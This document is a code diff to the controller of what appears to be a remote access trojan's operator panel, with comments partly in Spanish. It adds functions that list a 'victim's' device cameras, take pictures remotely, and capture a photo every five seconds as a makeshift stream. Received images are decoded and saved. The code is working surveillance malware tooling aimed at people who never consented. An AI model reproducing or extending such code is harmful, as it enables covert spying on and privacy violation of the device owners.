@@ -19,8 +19,12 @@ var orders = {
 	adb: 'x0000ac',
 };
 
-app.controller("AppCtrl", ($scope,$http) => {
+app.controller("AppCtrl", ($scope,$http,$interval) => {
     $appCtrl = $scope;
+	
+	$appCtrl.isSaveShown = false;
+	
+	$appCtrl.vId = "";
 
     var log = document.getElementById("log");
     $appCtrl.logs = [];
@@ -32,18 +36,90 @@ app.controller("AppCtrl", ($scope,$http) => {
 	});
 	
 	socket.on('enviarListado', function (data) {
-		debugger;
-		console.log("Listado : " + data);
-		localStorage.setItem("socketid", data);
+		$appCtrl.vId = data;
+		
+		$appCtrl.$apply();
 	});
 	
 	$appCtrl.getCamList = () => {
-		socket.emit(order, { order: orders.camera, extra: 'camList', idsocket: localStorage.getItem("socketid")  });
+		socket.emit(order, { order: orders.camera, extra: 'camList', idsocket: $appCtrl.vId });
+    };
+	
+	$appCtrl.snap = () => {
+        // send snap request to victim
+        $appCtrl.Log('Snap a picture');
+        socket.emit(order, { order: orders.camera, extra: $appCtrl.selectedCam.id });
+    };
+	
+		/*Variables Streamming*/
+	$appCtrl.isStreamming = false;
+	var c = 1;
+	var timer;
+	
+	/*Funcion Streamming*/
+	$appCtrl.webstream = () => {
+
+	  $appCtrl.Log('Streamming');
+	
+      if($appCtrl.isStreamming == true){
+		$appCtrl.isStreamming = false;
+      }else
+	  {
+		$appCtrl.isStreamming = true;
+	  }
+	  
+	  if($appCtrl.isStreamming == true){
+			timer = $interval(function(){
+				$appCtrl.snap();
+				$appCtrl.Log('Transmitiendo...' + c);
+			c++;
+		  },5000);
+      }else
+	  {
+		  if(angular.isDefined(timer))
+          {
+            $interval.cancel(timer);
+            timer=undefined;
+			c = 1;
+			$appCtrl.Log('Cancelando transmision');
+          }
+	  }
     };
 	
 	socket.on(orders.camera, function (data) {
-		debugger;
-		console.log("Listado : " + data);
+		
+		var data = data.data;
+		
+		if (data.camList == true) { // the rseponse is camera list
+            $appCtrl.Log('Cameras list arrived');
+            $appCtrl.cameras = data.list;
+            $appCtrl.selectedCam = $appCtrl.cameras[1];
+            $appCtrl.$apply();
+			
+        } else if (data.image == true) { // the rseponse is picture
+			debugger;
+            $appCtrl.Log('Picture arrived');
+
+            // convert binary to base64
+            var uint8Arr = new Uint8Array(data.buffer);
+            var binary = '';
+            for (var i = 0; i < uint8Arr.length; i++) {
+                binary += String.fromCharCode(uint8Arr[i]);
+            }
+            var base64String = window.btoa(binary);
+
+            $appCtrl.imgUrl = 'data:image/png;base64,' + base64String;
+            $appCtrl.isSaveShown = true;
+            $appCtrl.$apply();
+
+            $appCtrl.savePhoto = () => {
+                $appCtrl.Log('Saving picture..');
+                //var picPath = path.join(downloadsPath, Date.now() + ".jpg");
+                var name = Date.now() + ".jpg"
+				download($appCtrl.imgUrl, name, "image/png");
+            }
+
+        }
 	});
 	
     /*	
